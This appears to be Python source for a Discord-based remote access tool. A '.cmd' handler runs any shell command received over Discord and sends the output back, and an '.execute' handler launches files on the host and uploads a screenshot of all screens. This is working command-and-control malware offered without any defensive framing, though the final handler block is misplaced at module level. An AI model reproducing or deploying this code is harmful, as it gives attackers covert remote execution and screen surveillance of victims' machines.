import subprocess
import asyncio
import os
from PIL import ImageGrab
import discord

async def execute_command(command, ctx):
    """Execute a shell command and send output to Discord"""
    try:
        # Execute the command
        result = subprocess.run(command, capture_output=True, shell=True, text=True, timeout=30)
        cmd_output = result.stdout.strip()
        
        if not cmd_output:
            cmd_output = "Command executed successfully (no output)"
        
        # Send command header
        await ctx.send(f'```Executed command: {command}\nstdout:```')
        
        # Split output into chunks and send
        message_buffer = ''
        for line in cmd_output.split('\n'):
            if len(message_buffer) + len(line) > 1950:
                await ctx.send(f'```{message_buffer}```')
                message_buffer = line
            else:
                message_buffer += line + '\n'
        
        # Send remaining buffer
        if message_buffer:
            await ctx.send(f'```{message_buffer}```')
        
        # Send footer
        await ctx.send('```End of command stdout```')
        
    except subprocess.TimeoutExpired:
        await ctx.send('```Command timed out after 30 seconds```')
    except Exception as e:
        await ctx.send(f'```Error executing command: {str(e)}```')

async def execute_file(filename, ctx):
    """Execute a file and send screenshot as proof"""
    try:
        # Check if file exists
        if not os.path.exists(filename):
            await ctx.send('```❗ File or directory not found.```')
            return
        
        # Execute the file
        subprocess.run(f'start "" "{filename}"', shell=True)
        
        # Wait a moment for the program to start
        await asyncio.sleep(2)
        
        # Take screenshot
        screenshot_path = 'ss.png'
        ImageGrab.grab(all_screens=True).save(screenshot_path)
        
        # Send screenshot embed
        embed = discord.Embed(
            title=f'Executed: {filename}',
            color=discord.Color.green()
        )
        embed.set_image(url='attachment://ss.png')
        
        await ctx.send(embed=embed, file=discord.File(screenshot_path))
        
        # Cleanup screenshot file
        try:
            os.remove(screenshot_path)
        except:
            pass
        
        await ctx.send(f'```Successfully executed: {filename}```')
        
    except Exception as e:
        await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')

# Main command handler
if ctx.message.content.startswith('.cmd '):
    command = ctx.message.content[5:].strip()
    if command:
        await execute_command(command, ctx)
    else:
        await ctx.send('```Syntax: .cmd <command>```')

elif ctx.message.content.startswith('.execute '):
    filename = ctx.message.content[9:].strip()
    if filename:
        await execute_file(filename, ctx)
    else:
        await ctx.send('```Syntax: .execute <filename>```')